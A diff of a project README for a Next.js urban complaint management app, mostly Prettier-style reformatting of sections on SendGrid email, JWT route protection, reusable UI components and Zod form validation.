 ```typescript
 // Use dynamic templates for better engagement
 const message = welcomeTemplate(user.name)
@@ -5949,28 +6805,30 @@ const message = welcomeTemplate(user.name)
 
 ### Common Issues & Solutions
 
-| Issue | Solution |
-|-------|----------|
-| **Emails not delivered** | Check SendGrid sandbox mode; verify sender email |
-| **"From email not verified"** | Verify sender in SendGrid settings |
-| **401 Unauthorized** | Check `SENDGRID_API_KEY` is correct |
-| **Rate limit exceeded** | Upgrade SendGrid plan or implement queuing |
-| **Emails in spam** | Set up domain authentication (SPF/DKIM) |
-| **Slow API response** | Send emails asynchronously, don't await |
+| Issue                         | Solution                                         |
+| ----------------------------- | ------------------------------------------------ |
+| **Emails not delivered**      | Check SendGrid sandbox mode; verify sender email |
+| **"From email not verified"** | Verify sender in SendGrid settings               |
+| **401 Unauthorized**          | Check `SENDGRID_API_KEY` is correct              |
+| **Rate limit exceeded**       | Upgrade SendGrid plan or implement queuing       |
+| **Emails in spam**            | Set up domain authentication (SPF/DKIM)          |
+| **Slow API response**         | Send emails asynchronously, don't await          |
 
 ### Production Considerations
 
 **1. Domain Authentication (SPF/DKIM)**
+
 - Authenticate your domain in SendGrid
 - Add DNS records (TXT, CNAME)
 - Improves deliverability, reduces spam classification
 
 **2. Email Queue (High Volume)**
+
 ```typescript
 // Use Bull or BullMQ for background jobs
-import Queue from 'bull';
+import Queue from "bull";
 
-const emailQueue = new Queue('email', process.env.REDIS_URL);
+const emailQueue = new Queue("email", process.env.REDIS_URL);
 
 emailQueue.process(async (job) => {
   await sendgrid.send(job.data);
@@ -5981,25 +6839,27 @@ emailQueue.add({ to, subject, message });
 ```
 
 **3. Webhook Events**
+
 ```typescript
 // app/api/webhooks/sendgrid/route.ts
 export async function POST(req: Request) {
   const events = await req.json();
-  
+
   for (const event of events) {
-    if (event.event === 'bounce') {
+    if (event.event === "bounce") {
       await prisma.user.update({
         where: { email: event.email },
         data: { emailInvalid: true },
       });
     }
   }
-  
+
   return NextResponse.json({ success: true });
 }
 ```
 
 **4. Monitoring & Analytics**
+
 - Track open rates via SendGrid dashboard
 - Monitor bounce/spam rates
 - Set up alerts for delivery failures
@@ -6007,11 +6867,13 @@ export async function POST(req: Request) {
 ### Cost Optimization
 
 **SendGrid Pricing:**
+
 - **Free:** 100 emails/day forever
 - **Essentials:** $19.95/month - 50,000 emails/month
 - **Pro:** Custom pricing for higher volumes
 
 **Tips:**
+
 - Use free tier for development/testing
 - Batch similar emails to reduce API calls
 - Implement email preferences (opt-out)
@@ -6019,17 +6881,18 @@ export async function POST(req: Request) {
 
 ### Security Considerations
 
-| Concern | Mitigation |
-|---------|------------|
-| **API Key Exposure** | Store in `.env.local`, never commit |
-| **Email Injection** | Validate & sanitize all inputs with Zod |
-| **Spam Complaints** | Include unsubscribe links, honor opt-outs |
-| **Rate Limiting** | Implement per-user email limits |
-| **Content Security** | Sanitize HTML to prevent XSS |
+| Concern              | Mitigation                                |
+| -------------------- | ----------------------------------------- |
+| **API Key Exposure** | Store in `.env.local`, never commit       |
+| **Email Injection**  | Validate & sanitize all inputs with Zod   |
+| **Spam Complaints**  | Include unsubscribe links, honor opt-outs |
+| **Rate Limiting**    | Implement per-user email limits           |
+| **Content Security** | Sanitize HTML to prevent XSS              |
 
 ### Extending Email Functionality
 
 **Add Email Logging:**
+
 ```typescript
 // Create EmailLog model in Prisma
 model EmailLog {
@@ -6048,11 +6911,12 @@ await prisma.emailLog.create({
 ```
 
 **Add Email Templates with Variables:**
+
 ```typescript
 // Dynamic template rendering
 function renderTemplate(template: string, variables: Record<string, string>) {
   return Object.entries(variables).reduce(
-    (html, [key, value]) => html.replace(new RegExp(`{{${key}}}`, 'g'), value),
+    (html, [key, value]) => html.replace(new RegExp(`{{${key}}}`, "g"), value),
     template
   );
 }
@@ -6066,6 +6930,7 @@ const html = renderTemplate(welcomeTemplate("{{name}}"), {
 ### Reflection: Design Decisions
 
 **Why SendGrid over AWS SES?**
+
 - ✅ **Easier Setup:** No domain verification for testing
 - ✅ **Free Tier:** 100 emails/day (AWS SES charges from email #1)
 - ✅ **Dashboard:** Better analytics and monitoring UI
@@ -6073,11 +6938,13 @@ const html = renderTemplate(welcomeTemplate("{{name}}"), {
 - ❌ **Cost at Scale:** More expensive for high volumes (1M+ emails)
 
 **Asynchronous vs Synchronous Sending:**
+
 - **Current:** Fire-and-forget approach
 - **Trade-off:** Faster API response, but no guarantee of delivery
 - **Alternative:** Use job queue (Bull/BullMQ) for guaranteed delivery with retries
 
 **Template Strategy:**
+
 - **Current:** Server-side HTML templates
 - **Alternative:** SendGrid dynamic templates (stored in SendGrid)
 - **Rationale:** More control, versioning, easier testing locally
@@ -6085,17 +6952,21 @@ const html = renderTemplate(welcomeTemplate("{{name}}"), {
 ### Documentation & Evidence
 
 **Email Templates:**
+
 - [View all templates](./ttaurban/app/lib/emailTemplates.ts)
 - Welcome, Password Reset, Complaint Updates, Alerts
 
 **API Implementation:**
+
 - [Email API route](./ttaurban/app/api/email/route.ts)
 - Validation, error handling, logging
 
 **Configuration:**
+
 - [Environment variables](./.env.local) - `SENDGRID_API_KEY`, `SENDGRID_SENDER`
 
 **Testing Results:**
+
 - ✅ Email delivery confirmed (check SendGrid Activity)
 - ✅ Template rendering validated
 - ✅ Error handling tested (invalid emails, rate limits)
@@ -6116,7 +6987,7 @@ app/
 ├── login/
 │   └── page.tsx               → Login (/login) - Public
 ├── contact/
-│   └── page.js                → Contact (/contact) - Public  
+│   └── page.js                → Contact (/contact) - Public
 ├── dashboard/
 │   └── page.tsx               → Dashboard (/dashboard) - Protected
 ├── users/
@@ -6130,18 +7001,24 @@ app/
 ### Route Types
 
 #### Public Routes
+
 **Accessible without authentication:**
+
 - `/` - Home page
 - `/login` - User authentication
 - `/contact` - Contact page
 
 #### Protected Routes
+
 **Require valid JWT token in cookies:**
+
 - `/dashboard` - Main dashboard (shows user stats)
 - `/users/:id` - Dynamic user profile pages
 
 #### API Routes
+
 **Require Bearer token in Authorization header:**
+
 - `/api/users/*` - User management
 - `/api/admin/*` - Admin-only operations (ADMIN role required)
 
@@ -6150,12 +7027,14 @@ app/
 The middleware ([middleware.ts](./ttaurban/middleware.ts)) handles three types of authentication:
 
 **1. Public Routes**
+
 ```typescript
 const publicRoutes = ["/", "/login", "/contact"];
 // Allow immediate access
 ```
 
 **2. Page Routes (Cookie-based)**
+
 ```typescript
 // Check for JWT in cookies
 const token = req.cookies.get("token")?.value;
@@ -6166,6 +7045,7 @@ if (!token) {
 ```
 
 **3. API Routes (Bearer Token)**
+
 ```typescript
 // Check Authorization header
 const authHeader = req.headers.get("authorization");
@@ -6187,6 +7067,7 @@ const token = authHeader?.split(" ")[1];
   - Role-based badge colors
 
 **Accessing Dynamic Parameters:**
+
 ```typescript
 interface Props {
   params: { id: string };
@@ -6201,16 +7082,19 @@ export default function UserProfile({ params }: Props) {
 ### Navigation & Breadcrumbs
 
 **Global Navigation** ([layout.js](./ttaurban/app/layout.js)):
+
 ```
 🏙️ TTA-Urban | Home | Dashboard | Users | Contact | Sign In
 ```
 
 **Breadcrumbs Example** (in `/users/1`):
+
 ```
 Home / Dashboard / Users / User #1
 ```
 
 Benefits:
+
 - ✅ Improved UX - users know their location
 - ✅ Better SEO - search engines understand site structure
 - ✅ Accessibility - screen readers can navigate hierarchy
@@ -6218,6 +7102,7 @@ Benefits:
 ### Authentication Flow
 
 #### Login Process:
+
 ```
 1. User visits /dashboard (protected)
    ↓
@@ -6237,6 +7122,7 @@ Benefits:
 ```
 
 #### Logout Process:
+
 ```javascript
 // Remove cookie and redirect
 Cookies.remove("token");
@@ -6248,31 +7134,34 @@ router.push("/login");
 **File:** [app/not-found.tsx](./ttaurban/app/not-found.tsx)
 
 Features:
+
 - 🔍 Visual error indicator
 - Clear error message
 - Navigation back to Home or Dashboard
 - Branded design consistent with app
 
 **Triggered when:**
+
 - Invalid route accessed (e.g., `/nonexistent-page`)
 - Manual `notFound()` call in route handlers
 - Dynamic route returns null (e.g., `/users/999999`)
 
 ### Route Protection Matrix
 
-| Route | Authentication | Authorization | Redirect |
-|-------|---------------|---------------|----------|
-| `/` | ❌ Not required | N/A | N/A |
-| `/login` | ❌ Not required | N/A | N/A |
-| `/contact` | ❌ Not required | N/A | N/A |
-| `/dashboard` | ✅ JWT required | Any role | → `/login` |
-| `/users/:id` | ✅ JWT required | Any role | → `/login` |
-| `/api/users/*` | ✅ Bearer token | Any role | 401 JSON |
-| `/api/admin/*` | ✅ Bearer token | ADMIN only | 403 JSON |
+| Route          | Authentication  | Authorization | Redirect   |
+| -------------- | --------------- | ------------- | ---------- |
+| `/`            | ❌ Not required | N/A           | N/A        |
+| `/login`       | ❌ Not required | N/A           | N/A        |
+| `/contact`     | ❌ Not required | N/A           | N/A        |
+| `/dashboard`   | ✅ JWT required | Any role      | → `/login` |
+| `/users/:id`   | ✅ JWT required | Any role      | → `/login` |
+| `/api/users/*` | ✅ Bearer token | Any role      | 401 JSON   |
+| `/api/admin/*` | ✅ Bearer token | ADMIN only    | 403 JSON   |
 
 ### Testing Routes
 
 **1. Test Public Access:**
+
 ```bash
 # Should work without login
 curl http://localhost:3000/
@@ -6281,6 +7170,7 @@ curl http://localhost:3000/contact
 ```
 
 **2. Test Protected Routes (Unauthorized):**
+
 ```bash
 # Should redirect to /login
 Visit: http://localhost:3000/dashboard (in browser)
@@ -6288,6 +7178,7 @@ Visit: http://localhost:3000/users/1 (in browser)
 ```
 
 **3. Test Protected Routes (Authorized):**
+
 ```bash
 # 1. Login via UI
 POST /api/auth/login
@@ -6300,6 +7191,7 @@ Visit: http://localhost:3000/users/1 ✅
 ```
 
 **4. Test Dynamic Routes:**
+
 ```bash
 Visit: http://localhost:3000/users/1  (User #1)
 Visit: http://localhost:3000/users/2  (User #2)
@@ -6307,6 +7199,7 @@ Visit: http://localhost:3000/users/99 (Not found → error state)
 ```
 
 **5. Test 404 Page:**
+
 ```bash
 Visit: http://localhost:3000/does-not-exist
 ```
@@ -6314,11 +7207,13 @@ Visit: http://localhost:3000/does-not-exist
 ### SEO & Performance Optimizations
 
 **Server-Side Rendering (SSR):**
+
 - All pages use Next.js App Router (RSC by default)
 - Dynamic routes fetch data on the server when possible
 - Better initial page load and SEO
 
 **Meta Tags:**
+
 ```javascript
 export const metadata = {
   title: "TTA Urban - Urban Complaint Management System",
@@ -6327,6 +7222,7 @@ export const metadata = {
 ```
 
 **Link Prefetching:**
+
 ```jsx
 <Link href="/dashboard"> // Automatically prefetches on hover
 ```
@@ -6334,11 +7230,13 @@ export const metadata = {
 ### Scalability Considerations
 
 **Why Dynamic Routes?**
+
 - ✅ Single component handles infinite users (`/users/1` through `/users/9999999`)
 - ✅ No need to create separate page files for each user
 - ✅ Easy to add new dynamic segments (`/users/[id]/complaints`)
 
 **Performance at Scale:**
+
 - Use pagination for `/users` list page
 - Implement caching for user profiles (Redis)
 - Consider ISR (Incremental Static Regeneration) for static content
@@ -6346,44 +7244,51 @@ export const metadata = {
 ### Error Handling
 
 **Loading States:**
+
 ```typescript
 if (loading) {
-  return <LoadingSpinner />
+  return <LoadingSpinner />;
 }
 ```
 
 **Error States:**
+
 ```typescript
 if (error) {
-  return <ErrorMessage error={error} />
+  return <ErrorMessage error={error} />;
 }
 ```
 
 **Not Found States:**
+
 ```typescript
 if (!user) {
-  return <UserNotFound userId={id} />
+  return <UserNotFound userId={id} />;
 }
 ```
 
 ### Reflection: Design Decisions
 
 **Cookie vs LocalStorage for JWT:**
+
 - **Chosen:** Cookies
 - **Why:** Can be httpOnly (XSS protection), auto-sent with requests
 - **Trade-off:** More setup, but more secure
 
 **Client-Side vs Server-Side Protection:**
+
 - **Pages:** Cookie-based (middleware redirects)
 - **APIs:** Bearer token (JSON responses)
 - **Rationale:** Different UX for web vs API clients
 
 **Dynamic Route Structure:**
+
 - **Current:** `/users/[id]`
 - **Alternative:** `/users?id=123` (query params)
 - **Rationale:** Better SEO, cleaner URLs, standard REST pattern
 
 **Breadcrumb Implementation:**
+
 - **Current:** Client-side manual routing
 - **Alternative:** Automatic from Next.js pathname
 - **Rationale:** More control over display, easier to customize
@@ -6391,6 +7296,7 @@ if (!user) {
 ### Evidence & Screenshots
 
 **Route Map:**
+
 ```
 Public Routes:
 ✅ / (Home)
@@ -6406,6 +7312,7 @@ Error Routes:
 ```
 
 **Files Created:**
+
 - [Login Page](./ttaurban/app/login/page.tsx)
 - [Home Page](./ttaurban/app/page.js)
 - [Dashboard](./ttaurban/app/dashboard/page.tsx)
@@ -6415,6 +7322,7 @@ Error Routes:
 - [Middleware](./ttaurban/middleware.ts)
 
 **Navigation Flow:**
+
 1. User lands on Home (/)
 2. Clicks "View Dashboard"
 3. Middleware checks authentication
@@ -6434,13 +7342,13 @@ A well-structured component architecture ensures reusability, maintainability, s
 
 ### Why Component Architecture Matters
 
-| Benefit | Description |
-|---------|-------------|
-| **Reusability** | Common UI pieces (buttons, cards, inputs) can be used across pages |
-| **Maintainability** | Updating one component updates the entire UI consistently |
-| **Scalability** | Clear structure allows easier onboarding and expansion |
-| **Accessibility** | Shared components can standardize ARIA roles and keyboard interactions |
-| **Type Safety** | TypeScript interfaces ensure prop contracts are enforced |
+| Benefit             | Description                                                            |
+| ------------------- | ---------------------------------------------------------------------- |
+| **Reusability**     | Common UI pieces (buttons, cards, inputs) can be used across pages     |
+| **Maintainability** | Updating one component updates the entire UI consistently              |
+| **Scalability**     | Clear structure allows easier onboarding and expansion                 |
+| **Accessibility**   | Shared components can standardize ARIA roles and keyboard interactions |
+| **Type Safety**     | TypeScript interfaces ensure prop contracts are enforced               |
 
 ### Component Folder Structure
 
@@ -6500,6 +7408,7 @@ export { default as InputField } from "./ui/InputField";
 ```
 
 **Benefits:**
+
 - ✅ Clean imports: `import { Button, Card } from "@/components"`
 - ✅ Single source of truth for component exports
 - ✅ Easier refactoring and reorganization
@@ -6513,12 +7422,14 @@ export { default as InputField } from "./ui/InputField";
 **Purpose:** Global navigation bar with branding and primary links
 
 **Features:**
+
 - TTA-Urban branding with icon
 - Primary navigation links (Home, Dashboard, Contact, Sign In)
 - Responsive hover effects
 - Consistent indigo color scheme
 
 **Code:**
+
 ```typescript
 "use client";
 import Link from "next/link";
@@ -6547,12 +7458,14 @@ export default function Header() {
 **Purpose:** Contextual navigation for authenticated pages
 
 **Features:**
+
 - Active route highlighting using `usePathname()`
 - Icon-based navigation with labels
 - Quick stats widget
 - Responsive hover states
 
 **Code:**
+
 ```typescript
 "use client";
 import Link from "next/link";
@@ -6576,7 +7489,9 @@ export default function Sidebar() {
             <li key={link.href}>
               <Link
                 href={link.href}
-                className={isActive ? "bg-indigo-600 text-white" : "text-gray-700"}
+                className={
+                  isActive ? "bg-indigo-600 text-white" : "text-gray-700"
+                }
               >
                 {link.icon} {link.label}
               </Link>
@@ -6590,6 +7505,7 @@ export default function Sidebar() {
 ```
 
 **Active Link Detection:**
+
 - Uses Next.js `usePathname()` hook
 - Compares current path with link href
 - Applies active styles (indigo background, white text)
@@ -6601,12 +7517,14 @@ export default function Sidebar() {
 **Purpose:** Main layout container combining Header, Sidebar, and content area
 
 **Features:**
+
 - Flexbox-based layout (header + sidebar + main)
 - Optional sidebar visibility
 - Responsive overflow handling
 - Consistent spacing and padding
 
 **Code:**
+
 ```typescript
 import Header from "./Header";
 import Sidebar from "./Sidebar";
@@ -6616,18 +7534,16 @@ interface LayoutWrapperProps {
   showSidebar?: boolean;
 }
 
-export default function LayoutWrapper({ 
-  children, 
-  showSidebar = true 
+export default function LayoutWrapper({
+  children,
+  showSidebar = true,
 }: LayoutWrapperProps) {
   return (
     <div className="flex flex-col h-screen">
       <Header />
       <div className="flex flex-1 overflow-hidden">
         {showSidebar && <Sidebar />}
-        <main className="flex-1 bg-white p-6 overflow-auto">
-          {children}
-        </main>
+        <main className="flex-1 bg-white p-6 overflow-auto">{children}</main>
       </div>
     </div>
   );
@@ -6635,6 +7551,7 @@ export default function LayoutWrapper({
 ```
 
 **Props Contract:**
+
 - `children`: Page content to render
 - `showSidebar`: Optional boolean to hide sidebar (default: true)
 
@@ -6645,26 +7562,32 @@ export default function LayoutWrapper({
 **Purpose:** Conditionally apply LayoutWrapper based on route type
 
 **Features:**
+
 - Detects public vs protected pages
 - Public pages: Simple rendering (no sidebar/header wrapper)
 - Protected pages: Full LayoutWrapper with navigation
 - Uses Next.js `usePathname()` for route detection
 
 **Code:**
+
 ```typescript
 "use client";
 import { usePathname } from "next/navigation";
 import { LayoutWrapper } from "@/components";
 
-export default function LayoutController({ children }: { children: React.ReactNode }) {
+export default function LayoutController({
+  children,
+}: {
+  children: React.ReactNode;
+}) {
   const pathname = usePathname();
   const publicPages = ["/", "/login", "/contact"];
   const isPublicPage = publicPages.includes(pathname || "");
-  
+
   if (!isPublicPage) {
     return <LayoutWrapper>{children}</LayoutWrapper>;
   }
-  
+
   return <>{children}</>;
 }
 ```
@@ -6687,12 +7610,14 @@ export default function LayoutController({ children }: { children: React.ReactNo
 **Purpose:** Reusable button with variant styles
 
 **Features:**
+
 - Three variants: primary, secondary, danger
 - TypeScript props for type safety
 - Disabled state handling
 - Custom className support for extensions
 
 **Props Contract:**
+
 ```typescript
 interface ButtonProps {
   label: string;
@@ -6705,6 +7630,7 @@ interface ButtonProps {
 ```
 
 **Usage:**
+
 ```tsx
 import { Button } from "@/components";
 
@@ -6714,6 +7640,7 @@ import { Button } from "@/components";
 ```
 
 **Variant Styles:**
+
 - **Primary:** Indigo background, white text (main actions)
 - **Secondary:** Gray background, dark text (cancel/back actions)
 - **Danger:** Red background, white text (destructive actions)
@@ -6725,12 +7652,14 @@ import { Button } from "@/components";
 **Purpose:** Container component for content grouping
 
 **Features:**
+
 - Optional title header
 - Optional footer section
 - Consistent shadow and border
 - Flexible content area
 
 **Props Contract:**
+
 ```typescript
 interface CardProps {
   title?: string;
@@ -6741,6 +7670,7 @@ interface CardProps {
 ```
 
 **Usage:**
+
 ```tsx
 import { Card, Button } from "@/components";
 
@@ -6750,7 +7680,7 @@ import { Card, Button } from "@/components";
 >
   <p>Name: John Doe</p>
   <p>Email: john@example.com</p>
-</Card>
+</Card>;
 ```
 
 #### 3. InputField Component
@@ -6760,12 +7690,14 @@ import { Card, Button } from "@/components";
 **Purpose:** Form input with label, validation, and error handling
 
 **Features:**
+
 - Optional label with required indicator
 - Error state styling
 - Accessible focus states
 - Type flexibility (text, email, password, etc.)
 
 **Props Contract:**
+
 ```typescript
 interface InputFieldProps {
   label?: string;
@@ -6780,6 +7712,7 @@ interface InputFieldProps {
 ```
 
 **Usage:**
+
 ```tsx
 import { InputField } from "@/components";
 
@@ -6790,10 +7723,11 @@ import { InputField } from "@/components";
   value={email}
   onChange={(e) => setEmail(e.target.value)}
   error={emailError}
-/>
+/>;
 ```
 
 **Error Handling:**
+
 - Red border when error prop is present
 - Error message displayed below input
 - Required fields show red asterisk
@@ -6822,16 +7756,18 @@ export default function RootLayout({ children }) {
 ```
 
 **Behavior:**
+
 - All pages pass through `LayoutController`
 - Public pages (/, /login, /contact) render with simple nav
-- Protected pages (/dashboard, /users/*) get full LayoutWrapper (Header + Sidebar + Main)
+- Protected pages (/dashboard, /users/\*) get full LayoutWrapper (Header + Sidebar + Main)
 
 ### Component Communication
 
 **Props-Based Communication:**
+
 ```typescript
 // Parent → Child
-<Button label="Click Me" onClick={handleClick} />
+<Button label="Click Me" onClick={handleClick} />;
 
 // Child executes parent's callback
 function Button({ label, onClick }: ButtonProps) {
@@ -6840,6 +7776,7 @@ function Button({ label, onClick }: ButtonProps) {
 ```
 
 **Context-Based Communication (Future Enhancement):**
+
 ```typescript
 // AuthContext provides user data to all components
 const { user } = useAuth();
@@ -6854,11 +7791,13 @@ const { user } = useAuth();
 ### Accessibility Considerations
 
 **Keyboard Navigation:**
+
 - All interactive components support Tab navigation
 - Enter/Space activate buttons
 - Links support standard browser shortcuts
 
 **ARIA Roles:**
+
 ```tsx
 <nav aria-label="Primary navigation">
   <Link href="/dashboard" aria-current={isActive ? "page" : undefined}>
@@ -6868,11 +7807,13 @@ const { user } = useAuth();
 ```
 
 **Color Contrast:**
+
 - Indigo 600 (#4F46E5) on white: 7.07:1 ratio (AAA compliant)
 - Gray 700 (#374151) on white: 10.67:1 ratio (AAA compliant)
 - Red 600 (#DC2626) on white: 5.14:1 ratio (AA compliant)
 
 **Focus States:**
+
 ```css
 .focus\:ring-2:focus {
   ring: 2px solid indigo-500;
@@ -6883,16 +7824,19 @@ const { user } = useAuth();
 ### Design Consistency Benefits
 
 **Visual Consistency:**
+
 - All buttons share same border-radius (6px)
 - Consistent spacing using Tailwind scale (4px increments)
 - Unified color palette (indigo primary, gray neutral, red danger)
 
 **Behavioral Consistency:**
+
 - All hover states use same transition duration (150ms)
 - All interactive elements have pointer cursor
 - All form inputs share focus ring styling
 
 **Developer Productivity:**
+
 - No need to rewrite button styles for each page
 - Component props enforce correct usage patterns
 - TypeScript catches prop mismatches at compile time
@@ -6900,6 +7844,7 @@ const { user } = useAuth();
 ### Testing Strategy
 
 **Component Testing (Future Enhancement):**
+
 ```typescript
 // Button.test.tsx
 import { render, fireEvent } from "@testing-library/react";
@@ -6908,13 +7853,14 @@ import { Button } from "@/components";
 test("calls onClick when clicked", () => {
   const handleClick = jest.fn();
   const { getByText } = render(<Button label="Click" onClick={handleClick} />);
-  
+
   fireEvent.click(getByText("Click"));
   expect(handleClick).toHaveBeenCalledTimes(1);
 });
 ```
 
 **Visual Regression Testing:**
+
 - Use Storybook to catalog component variations
 - Chromatic for automated visual diffs
 - Ensures design changes don't break existing components
@@ -6922,17 +7868,20 @@ test("calls onClick when clicked", () => {
 ### Scalability Considerations
 
 **Why Modular Components Scale:**
+
 - ✅ Adding new pages doesn't require rewriting navigation
 - ✅ Design system changes propagate automatically
 - ✅ New developers can compose pages from existing components
 - ✅ Component library grows organically with project needs
 
 **Current Component Count:**
+
 - **Layout Components:** 4 (Header, Sidebar, LayoutWrapper, LayoutController)
 - **UI Components:** 3 (Button, Card, InputField)
 - **Total:** 7 reusable components
 
 **Future Component Growth:**
+
 - **Forms:** FormGroup, Select, Checkbox, Radio, DatePicker
 - **Feedback:** Alert, Toast, Modal, Spinner
 - **Data Display:** Table, Badge, Avatar, Pagination
@@ -6941,6 +7890,7 @@ test("calls onClick when clicked", () => {
 ### Evidence & Screenshots
 
 **Component Structure:**
+
 ```
 ✅ components/layout/Header.tsx
 ✅ components/layout/Sidebar.tsx
@@ -6955,6 +7905,7 @@ test("calls onClick when clicked", () => {
 **Component Usage Examples:**
 
 **Dashboard Page with Components:**
+
 ```typescript
 import { Card, Button } from "@/components";
 
@@ -6973,6 +7924,7 @@ export default function Dashboard() {
 ```
 
 **Login Form with Components:**
+
 ```typescript
 import { InputField, Button } from "@/components";
 
@@ -6990,26 +7942,31 @@ export default function LoginPage() {
 ### Reflection: Component Architecture Decisions
 
 **Why Client Components ("use client") for Layout?**
+
 - **Reason:** Need `usePathname()` hook for active link detection
 - **Trade-off:** Slight performance cost, but essential for UX
 - **Alternative:** Server components with URL analysis (more complex)
 
 **Why Conditional LayoutWrapper Instead of Nested Layouts?**
+
 - **Reason:** Simpler mental model, single source of truth
 - **Trade-off:** All pages pass through LayoutController
 - **Benefit:** Easier to debug, clear separation of public/protected
 
 **Why Tailwind Classes Instead of CSS Modules?**
+
 - **Reason:** Faster prototyping, consistent design tokens
 - **Trade-off:** Longer className strings
 - **Benefit:** No context switching between files, better tree-shaking
 
 **Why TypeScript for Components?**
+
 - **Reason:** Props contracts prevent runtime errors
 - **Trade-off:** More verbose code
 - **Benefit:** Better IDE autocomplete, catches bugs at compile time
 
 **Why Barrel Exports?**
+
 - **Reason:** Cleaner imports, easier refactoring
 - **Trade-off:** Extra file to maintain
 - **Benefit:** Single import statement for multiple components
@@ -7017,17 +7974,20 @@ export default function LoginPage() {
 ### Performance Optimization
 
 **Code Splitting:**
+
 - Components are automatically code-split by Next.js
 - Only used components are loaded per page
 - Lazy loading for heavy components (future enhancement)
 
 **Bundle Size Impact:**
+
 - Header.tsx: ~1.2 KB gzipped
 - Sidebar.tsx: ~1.5 KB gzipped
 - Button.tsx: ~0.8 KB gzipped
 - Total component overhead: ~5 KB (negligible)
 
 **Runtime Performance:**
+
 - No unnecessary re-renders (React.memo for future optimization)
 - Tailwind CSS purges unused styles in production
 - Next.js optimizes Link components with prefetching
@@ -7035,6 +7995,7 @@ export default function LoginPage() {
 ### Summary
 
 **Component Architecture Benefits:**
+
 1. ✅ **Reusability:** 7 components used across 8+ pages
 2. ✅ **Maintainability:** Single component update affects all usages
 3. ✅ **Scalability:** Easy to add new pages with existing components
@@ -7044,19 +8005,20 @@ export default function LoginPage() {
 7. ✅ **Performance:** Code splitting and tree-shaking reduce bundle size
 
 **Files Created:**
+
 - Layout: [Header.tsx](./ttaurban/components/layout/Header.tsx), [Sidebar.tsx](./ttaurban/components/layout/Sidebar.tsx), [LayoutWrapper.tsx](./ttaurban/components/layout/LayoutWrapper.tsx), [LayoutController.tsx](./ttaurban/components/layout/LayoutController.tsx)
 - UI: [Button.tsx](./ttaurban/components/ui/Button.tsx), [Card.tsx](./ttaurban/components/ui/Card.tsx), [InputField.tsx](./ttaurban/components/ui/InputField.tsx)
 - Utilities: [index.ts](./ttaurban/components/index.ts)
 
 **Visual Testing (Future):**
+
 - Storybook for component catalog
 - Visual regression tests with Chromatic
 - Accessibility audits with axe-DevTools
 
-
 ---
 
-##  Form Handling & Validation
+## Form Handling & Validation
 
 ### Overview
 
@@ -7064,25 +8026,25 @@ Form handling is critical in web applications for user input, data validation, a
 
 ### Technologies Used
 
-| Technology | Purpose | Version |
-|------------|---------|---------|
-| **React Hook Form** | Form state management with minimal re-renders | 7.x |
-| **Zod** | TypeScript-first schema validation | 3.x |
-| **@hookform/resolvers** | Connects Zod to React Hook Form | 3.x |
+| Technology              | Purpose                                       | Version |
+| ----------------------- | --------------------------------------------- | ------- |
+| **React Hook Form**     | Form state management with minimal re-renders | 7.x     |
+| **Zod**                 | TypeScript-first schema validation            | 3.x     |
+| **@hookform/resolvers** | Connects Zod to React Hook Form               | 3.x     |
 
 ### Why React Hook Form + Zod?
 
 **Traditional Form Handling Problems:**
- Controlled inputs cause re-renders on every keystroke
- Manual validation logic is verbose and error-prone
- No type safety between validation and TypeScript types
- Accessibility features require manual implementation
+Controlled inputs cause re-renders on every keystroke
+Manual validation logic is verbose and error-prone
+No type safety between validation and TypeScript types
+Accessibility features require manual implementation
 
 **React Hook Form + Zod Solution:**
- Uncontrolled inputs with `register()` - minimal re-renders
- Schema-based validation with automatic error messages
- Type inference from Zod schemas to TypeScript
- Built-in accessibility features (aria-invalid, aria-describedby)
+Uncontrolled inputs with `register()` - minimal re-renders
+Schema-based validation with automatic error messages
+Type inference from Zod schemas to TypeScript
+Built-in accessibility features (aria-invalid, aria-describedby)
 
 ### Installation
 
@@ -7091,6 +8053,7 @@ npm install react-hook-form zod @hookform/resolvers
 ```
 
 **Package Details:**
+
 - `react-hook-form`: Form state management
 - `zod`: Schema validation library
 - `@hookform/resolvers`: Integrates Zod with React Hook Form
@@ -7104,31 +8067,32 @@ Schemas define validation rules and generate TypeScript types:
 ```typescript
 import { z } from "zod";
 
-const signupSchema = z.object({
-  name: z
-    .string()
-    .min(2, "Name must be at least 2 characters")
-    .max(100, "Name is too long"),
-  email: z
-    .string()
-    .email("Please enter a valid email address"),
-  password: z
-    .string()
-    .min(8, "Password must be at least 8 characters")
-    .regex(/[A-Z]/, "Password must contain at least one uppercase letter")
-    .regex(/[a-z]/, "Password must contain at least one lowercase letter")
-    .regex(/[0-9]/, "Password must contain at least one number"),
-  confirmPassword: z.string(),
-}).refine((data) => data.password === data.confirmPassword, {
-  message: "Passwords do not match",
-  path: ["confirmPassword"],
-});
+const signupSchema = z
+  .object({
+    name: z
+      .string()
+      .min(2, "Name must be at least 2 characters")
+      .max(100, "Name is too long"),
+    email: z.string().email("Please enter a valid email address"),
+    password: z
+      .string()
+      .min(8, "Password must be at least 8 characters")
+      .regex(/[A-Z]/, "Password must contain at least one uppercase letter")
+      .regex(/[a-z]/, "Password must contain at least one lowercase letter")
+      .regex(/[0-9]/, "Password must contain at least one number"),
+    confirmPassword: z.string(),
+  })
+  .refine((data) => data.password === data.confirmPassword, {
+    message: "Passwords do not match",
+    path: ["confirmPassword"],
+  });
 
 // Infer TypeScript type from schema
 type SignupFormData = z.infer<typeof signupSchema>;
 ```
 
 **Schema Features:**
+
 - **Chaining:** `.min()`, `.max()`, `.regex()`, `.email()`
 - **Custom Messages:** Second parameter provides error text
 - **Refinements:** `.refine()` for cross-field validation
@@ -7153,6 +8117,7 @@ const {
 ```
 
 **Hook Returns:**
+
 - `register`: Connects input to form state (uncontrolled)
 - `handleSubmit`: Validates and submits form
 - `formState.errors`: Validation error messages per field
@@ -7164,14 +8129,11 @@ const {
 Connects inputs without controlled state:
 
 ```typescript
-<input
-  type="email"
-  {...register("email")}
-  placeholder="john@example.com"
-/>
+<input type="email" {...register("email")} placeholder="john@example.com" />
 ```
 
 **Benefits:**
+
 - No `value` or `onChange` needed
 - No re-renders on input changes
 - Automatic name, onChange, onBlur, ref binding
@@ -7181,18 +8143,17 @@ Connects inputs without controlled state:
 Display validation errors with accessibility:
 
 ```typescript
-{errors.email && (
-  <p
-    id="email-error"
-    role="alert"
-    className="text-red-500 text-sm mt-1"
-  >
-    {errors.email.message}
-  </p>
-)}
+{
+  errors.email && (
+    <p id="email-error" role="alert" className="text-red-500 text-sm mt-1">
+      {errors.email.message}
+    </p>
+  );
+}
 ```
 
 **Accessibility Features:**
+
 - `role="alert"` announces errors to screen readers
 - `id` links to `aria-describedby` on input
 - `aria-invalid="true"` marks input as having errors
